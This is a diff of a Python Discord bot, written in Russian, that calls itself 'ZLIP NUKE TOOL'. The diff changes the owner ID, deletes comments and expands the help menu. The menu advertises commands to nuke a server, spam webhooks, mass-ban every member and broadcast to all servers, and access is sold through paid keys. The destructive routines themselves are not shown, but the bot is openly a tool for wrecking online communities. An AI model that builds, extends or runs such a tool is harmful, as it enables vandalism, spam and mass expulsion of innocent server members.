@@ -15,7 +15,7 @@ rate_limit_hits = 0
 webhook_spam_active = False
 
 # === АДМИН ПАНЕЛЬ (только ты) ===
-OWNER_ID = 1448196738308509739  # ТВОЙ ID (замени)
+OWNER_ID = 123456789012345678  # ТВОЙ ID (замени)
 
 # === КЛЮЧИ ===
 keys_db = "keys.json"
@@ -92,12 +92,10 @@ async def genkey(ctx, arg = None):
     user_id = None
     user_name = "Неизвестный"
     
-    # Пробуем получить пользователя по упоминанию
     try:
         if arg.startswith('<@') and arg.endswith('>'):
             user_id = arg.replace('<@', '').replace('>', '').replace('!', '')
         else:
-            # Пробуем как ID
             user_id = int(arg)
     except:
         await ctx.send("❌ Неверный формат. Используй @user или ID")
@@ -105,7 +103,6 @@ async def genkey(ctx, arg = None):
     
     user_id = str(user_id)
     
-    # Пытаемся получить инфо о пользователе
     try:
         user = await bot.fetch_user(int(user_id))
         user_name = user.name
@@ -124,7 +121,6 @@ async def genkey(ctx, arg = None):
     embed.add_field(name="Статус", value="Активирован", inline=False)
     await ctx.send(embed=embed)
     
-    # Пытаемся отправить в личку
     try:
         user = await bot.fetch_user(int(user_id))
         await user.send(f"🔥 Ты получил доступ к боту ZLIP NUKE!\nИспользуй `-dszlip` для нюка")
@@ -230,20 +226,24 @@ async def servers(ctx):
 # === КОМАНДЫ ДЛЯ ВСЕХ С КЛЮЧОМ ===
 @bot.command()
 async def help(ctx):
-    if not has_valid_key(ctx.author.id) and not is_owner(ctx):
-        await ctx.send("❌ У тебя нет доступа! Купи ключ у владельца")
-        return
-    
     embed = discord.Embed(
         title="🔥 ZLIP NUKE TOOL 🔥",
-        description="Команды для уничтожения",
+        description="Все доступные команды",
         color=discord.Color.red()
     )
+    embed.add_field(name="━━━━ ❗ ОСНОВНЫЕ ❗ ━━━━", value="", inline=False)
     embed.add_field(name="-dszlip", value="Запускает нюк сервера", inline=False)
     embed.add_field(name="-status", value="Показывает статус бота", inline=False)
     embed.add_field(name="-ping", value="Проверка задержки", inline=False)
-    embed.add_field(name="-webhook", value="Спамит вебхуками", inline=False)
+    embed.add_field(name="-webhook", value="Спамит вебхуками (вкл/выкл)", inline=False)
     embed.add_field(name="-massban", value="Бан всех участников", inline=False)
+    embed.add_field(name="━━━━ 👑 АДМИН КОМАНДЫ 👑 ━━━━", value="", inline=False)
+    embed.add_field(name="-admin", value="Открыть админ панель", inline=False)
+    embed.add_field(name="-genkey @user/ID", value="Выдать ключ доступа", inline=False)
+    embed.add_field(name="-keys", value="Список всех ключей", inline=False)
+    embed.add_field(name="-delkey @user/ID", value="Удалить ключ", inline=False)
+    embed.add_field(name="-servers", value="Список серверов бота", inline=False)
+    embed.add_field(name="-broadcast", value="Рассылка всем серверам", inline=False)
     embed.set_footer(text="MOGGED BY ZLIP | Купи ключ у владельца")
     await ctx.send(embed=embed)
 
